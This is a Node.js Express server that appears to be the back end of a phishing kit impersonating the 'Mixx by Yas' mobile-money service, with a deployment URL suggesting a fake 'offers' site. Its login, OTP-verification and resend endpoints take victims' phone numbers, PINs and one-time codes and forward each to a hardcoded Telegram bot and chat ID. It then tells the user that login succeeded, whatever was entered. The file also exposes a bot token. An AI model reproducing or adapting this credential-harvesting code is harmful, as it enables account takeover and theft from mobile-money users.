const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

// ===== CORS =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'Accept'],
    credentials: true
}));

// ===== MIDDLEWARE =====
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== LOGGING =====
app.use((req, res, next) => {
    console.log(`📥 ${req.method} ${req.url}`);
    next();
});

// ===== PORT =====
const PORT = process.env.PORT || 5000;

// ===== TELEGRAM CREDENTIALS =====
const TELEGRAM_BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
const TELEGRAM_CHAT_ID = '8392790531';

console.log('🚀 Starting server...');
console.log(`📡 PORT: ${PORT}`);

// ===== SEND TO TELEGRAM =====
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram sent');
        return response.data;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        throw error;
    }
}

// ===== ENDPOINTS =====

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// ===== LOGIN - Send phone + PIN to Telegram =====
app.post('/api/login', async (req, res) => {
    console.log('📥 Login:', req.body);
    const { phone, pin } = req.body;
    
    if (!phone || !pin) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone and PIN are required'
        });
    }
    
    // Generate OTP
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    console.log(`🔐 OTP for ${phone}: ${otp}`);
    
    // ===== SEND TO TELEGRAM =====
    const message = `
🔔 <b>MIXX BY YAS - LOGIN</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔐 <b>PIN:</b> <code>${pin}</code>
🔑 <b>OTP:</b> <code>${otp}</code>
🕐 <b>Time:</b> ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━━
    `;
    
    try {
        await sendTelegramMessage(message);
        console.log('✅ Login details sent to Telegram');
    } catch (error) {
        console.log('❌ Failed to send to Telegram');
    }
    
    res.json({
        status: 'success',
        message: 'Login successful! OTP generated.',
        data: { phone, otp }
    });
});

// ===== VERIFY OTP - Send OTP + phone to Telegram =====
app.post('/api/verify-otp', async (req, res) => {
    console.log('📥 Verify OTP:', req.body);
    const { phone, otp } = req.body;
    
    if (!phone || !otp) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone and OTP are required'
        });
    }
    
    // ===== SEND TO TELEGRAM =====
    const message = `
✅ <b>MIXX BY YAS - OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔑 <b>OTP Entered:</b> <code>${otp}</code>
🕐 <b>Time:</b> ${new Date().toLocaleString()}
📊 <b>Status:</b> VERIFIED

━━━━━━━━━━━━━━━━━━━━━
    `;
    
    try {
        await sendTelegramMessage(message);
        console.log('✅ OTP verification sent to Telegram');
    } catch (error) {
        console.log('❌ Failed to send to Telegram');
    }
    
    // Always success for demo
    res.json({
        status: 'success',
        message: 'OTP verified successfully!',
        data: { phone, verified: true }
    });
});

// ===== RESEND OTP =====
app.post('/api/resend-otp', async (req, res) => {
    console.log('📥 Resend OTP:', req.body);
    const { phone } = req.body;
    
    if (!phone) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone is required'
        });
    }
    
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    console.log(`🔐 New OTP for ${phone}: ${otp}`);
    
    // ===== SEND TO TELEGRAM =====
    const message = `
🔄 <b>MIXX BY YAS - RESEND OTP</b>
━━━━━━━━━━━━━━━━━━━━━

📱 <b>Phone:</b> ${phone}
🔑 <b>New OTP:</b> <code>${otp}</code>
🕐 <b>Time:</b> ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━━
    `;
    
    try {
        await sendTelegramMessage(message);
        console.log('✅ Resend OTP sent to Telegram');
    } catch (error) {
        console.log('❌ Failed to send to Telegram');
    }
    
    res.json({
        status: 'success',
        message: 'New OTP sent successfully!',
        data: { phone, otp }
    });
});

// Root
app.get('/', (req, res) => {
    res.json({ 
        status: 'online', 
        message: 'Mixx by Yas API' 
    });
});

// ===== START SERVER =====
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 https://mixxbyyas-offers06com-production.up.railway.app`);
    console.log('✅ Server is ready!');
});
